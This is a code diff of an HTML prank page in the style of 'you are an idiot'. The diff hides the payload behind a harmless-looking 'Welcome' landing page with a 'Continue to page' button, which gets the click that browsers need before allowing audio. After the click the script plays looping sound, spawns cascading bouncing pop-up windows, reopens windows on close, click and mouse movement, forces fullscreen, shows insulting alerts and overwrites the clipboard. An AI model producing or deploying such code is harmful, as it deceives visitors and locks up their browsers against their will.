@@ -1,39 +1,94 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-    <title>you are an idiot</title>
-    <meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Welcome</title>
     <style>
-        body {
+        /* Landing Page Styles */
+        body, html {
+            margin: 0;
+            padding: 0;
+            height: 100%;
+            font-family: 'Arial', sans-serif;
+            background-color: #f0f0f0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            overflow: hidden;
+        }
+
+        #landing-page {
+            text-align: center;
+            z-index: 1000;
+            background: white;
+            padding: 40px;
+            border-radius: 12px;
+            box-shadow: 0 10px 25px rgba(0,0,0,0.1);
+        }
+
+        h2 {
+            color: #333;
+            margin-bottom: 20px;
+        }
+
+        #start-btn {
+            background-color: #007bff;
+            color: white;
+            border: none;
+            padding: 15px 30px;
+            font-size: 1.2rem;
+            border-radius: 8px;
+            cursor: pointer;
+            transition: transform 0.2s, background-color 0.2s;
+        }
+
+        #start-btn:hover {
+            background-color: #0056b3;
+            transform: scale(1.05);
+        }
+
+        /* The Chaos Container (Hidden initially) */
+        #chaos-container {
+            display: none; /* Hidden until button click */
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
             background-color: #000;
             color: #fff;
             font-family: Arial, sans-serif;
             text-align: center;
             overflow: hidden;
-            margin: 0;
-            padding: 0;
+            z-index: 9999;
         }
+
         .container {
             position: absolute;
             top: 50%;
             left: 50%;
             transform: translate(-50%, -50%);
         }
+
         h1 {
             font-size: 3em;
             margin: 0;
             padding: 0;
             animation: blink 0.5s infinite alternate;
         }
+
         @keyframes blink {
             from { opacity: 1; }
             to { opacity: 0; }
         }
+
         .face {
             font-size: 5em;
             margin: 20px 0;
             animation: spin 2s linear infinite;
         }
+
         @keyframes spin {
             0% { transform: rotate(0deg); }
             100% { transform: rotate(360deg); }
@@ -41,31 +96,119 @@
     </style>
 </head>
 <body>
-    <div class="container">
-        <h1>you are an idiot</h1>
-        <div class="face">🤪</div>
+
+    <!-- Landing Page -->
+    <div id="landing-page">
+        <h2>Welcome to the Experience</h2>
+        <button id="start-btn">Continue to page</button>
+    </div>
+
+    <!-- Chaos Content -->
+    <div id="chaos-container">
+        <div class="container">
+            <h1>you are an idiot</h1>
+            <div class="face">🤪</div>
+        </div>
     </div>
 
     <script>
-        // Play the annoying sound
-        function playSound() {
+        const startBtn = document.getElementById('start-btn');
+        const landingPage = document.getElementById('landing-page');
+        const chaosContainer = document.getElementById('chaos-container');
+        let chaosStarted = false;
+
+        startBtn.addEventListener('click', function() {
+            if (chaosStarted) return;
+            chaosStarted = true;
+
+            // Hide landing page, show chaos
+            landingPage.style.display = 'none';
+            chaosContainer.style.display = 'block';
+            document.body.style.overflow = 'hidden'; // Prevent scrolling
+
+            // 1. Play Sound (Now allowed because of click)
             const audio = new Audio('https://www.myinstants.com/media/sounds/idiot-sound.mp3');
             audio.loop = true;
             audio.volume = 1.0;
-            audio.play();
-        }
+            audio.play().catch(e => console.log("Audio play failed:", e));
 
-        // Open a shitload of bouncing windows
+            // 2. Start the chaos functions
+            setTimeout(openBouncingWindows, 100);
+            
+            // 3. Set up the traps
+            window.onbeforeunload = function() {
+                openBouncingWindows();
+                return "You can't escape, idiot!";
+            };
+
+            window.onunload = function() {
+                for (let i = 0; i < 10; i++) {
+                    window.open(window.location.href, '_blank', 'width=300,height=300');
+                }
+            };
+
+            document.onclick = function() {
+                for (let i = 0; i < 5; i++) {
+                    window.open(window.location.href, '_blank', 'width=300,height=300');
+                }
+            };
+
+            let mouseMoveCount = 0;
+            document.onmousemove = function() {
+                mouseMoveCount++;
+                if (mouseMoveCount % 50 === 0) {
+                    window.open(window.location.href, '_blank', 'width=300,height=300');
+                }
+            };
+
+            // Background flash
+            setInterval(function() {
+                chaosContainer.style.backgroundColor = `rgb(${Math.random()*255},${Math.random()*255},${Math.random()*255})`;
+            }, 2000);
+
+            // Periodic windows
+            setInterval(function() {
+                window.open(window.location.href, '_blank', 'width=300,height=300');
+            }, 5000);
+
+            // Fullscreen attempt
+            setInterval(function() {
+                if (document.documentElement.requestFullscreen) {
+                    document.documentElement.requestFullscreen().catch(e => {});
+                }
+            }, 15000);
+
+            // Random alerts
+            setInterval(function() {
+                const messages = [
+                    "YOU ARE AN IDIOT!",
+                    "CAN'T ESCAPE, IDIOT!",
+                    "HAHAHAHAHA!",
+                    "IDIOT IDIOT IDIOT!",
+                    "YOU'LL NEVER CLOSE THESE WINDOWS!"
+                ];
+                alert(messages[Math.floor(Math.random() * messages.length)]);
+            }, 20000);
+
+            // Clipboard spam
+            setInterval(function() {
+                if (navigator.clipboard) {
+                    navigator.clipboard.writeText("I AM AN IDIOT").catch(e => {});
+                }
+            }, 25000);
+        });
+
         function openBouncingWindows() {
+            // Note: Browsers will block most of these unless pop-ups are allowed for this site
             for (let i = 0; i < 15; i++) {
                 setTimeout(() => {
                     const width = 300 + Math.random() * 200;
                     const height = 300 + Math.random() * 200;
                     const left = Math.random() * (screen.width - width);
                     const top = Math.random() * (screen.height - height);
+                    
                     const newWindow = window.open(window.location.href, '_blank', `width=${width},height=${height},left=${left},top=${top}`);
                     
-                    // Add bouncing behavior to the new window
                     if (newWindow) {
                         let dx = (Math.random() - 0.5) * 20;
                         let dy = (Math.random() - 0.5) * 20;
@@ -78,18 +221,15 @@
                             
                             if (x <= 0 || x >= screen.width - width) {
                                 dx = -dx;
-                                // Change color when bouncing
                                 newWindow.document.body.style.backgroundColor = `rgb(${Math.random()*255},${Math.random()*255},${Math.random()*255})`;
                             }
                             if (y <= 0 || y >= screen.height - height) {
                                 dy = -dy;
-                                // Change color when bouncing
                                 newWindow.document.body.style.backgroundColor = `rgb(${Math.random()*255},${Math.random()*255},${Math.random()*255})`;
                             }
                             
                             newWindow.moveTo(x, y);
                             
-                            // Randomly resize
                             if (Math.random() < 0.05) {
                                 newWindow.resizeTo(
                                     width + (Math.random() - 0.5) * 100,
@@ -98,10 +238,8 @@
                             }
                         }, 30);
                         
-                        // Clear interval when window is closed
                         newWindow.onbeforeunload = () => clearInterval(bounceInterval);
                         
-                        // Open even more windows when this one is closed
                         newWindow.onunload = () => {
                             for (let j = 0; j < 3; j++) {
                                 window.open(window.location.href, '_blank', 'width=300,height=300');
@@ -111,77 +249,6 @@
                 }, i * 300);
             }
         }
-
-        // Make it impossible to close
-        window.onbeforeunload = function() {
-            openBouncingWindows();
-            return "You can't escape, idiot!";
-        };
-
-        // Open more windows when trying to close
-        window.onunload = function() {
-            for (let i = 0; i < 10; i++) {
-                window.open(window.location.href, '_blank', 'width=300,height=300');
-            }
-        };
-
-        // Open windows when clicking
-        document.onclick = function() {
-            for (let i = 0; i < 5; i++) {
-                window.open(window.location.href, '_blank', 'width=300,height=300');
-            }
-        };
-
-        // Open windows when moving mouse
-        let mouseMoveCount = 0;
-        document.onmousemove = function() {
-            mouseMoveCount++;
-            if (mouseMoveCount % 50 === 0) {
-                window.open(window.location.href, '_blank', 'width=300,height=300');
-            }
-        };
-
-        // Change background color randomly
-        setInterval(function() {
-            document.body.style.backgroundColor = `rgb(${Math.random()*255},${Math.random()*255},\${Math.random()*255})`;
-        }, 2000);
-
-        // Start the chaos
-        document.addEventListener('DOMContentLoaded', function() {
-            playSound();
-            setTimeout(openBouncingWindows, 1000);
-            
-            // Open more windows periodically
-            setInterval(function() {
-                window.open(window.location.href, '_blank', 'width=300,height=300');
-            }, 5000);
-            
-            // Fullscreen periodically
-            setInterval(function() {
-                if (document.documentElement.requestFullscreen) {
-                    document.documentElement.requestFullscreen();
-                }
-            }, 15000);
-            
-            // Random alerts
-            setInterval(function() {
-                const messages = [
-                    "YOU ARE AN IDIOT!",
-                    "CAN'T ESCAPE, IDIOT!",
-                    "HAHAHAHAHA!",
-                    "IDIOT IDIOT IDIOT!",
-                    "YOU'LL NEVER CLOSE THESE WINDOWS!"
-                ];
-                alert(messages[Math.floor(Math.random() * messages.length)]);
-            }, 20000);
-            
-            // Try to access clipboard
-            setInterval(function() {
-                if (navigator.clipboard) {
-                    navigator.clipboard.writeText("I AM AN IDIOT");
-                }
-            }, 25000);
-        });
     </script>
 </body>
 </html>
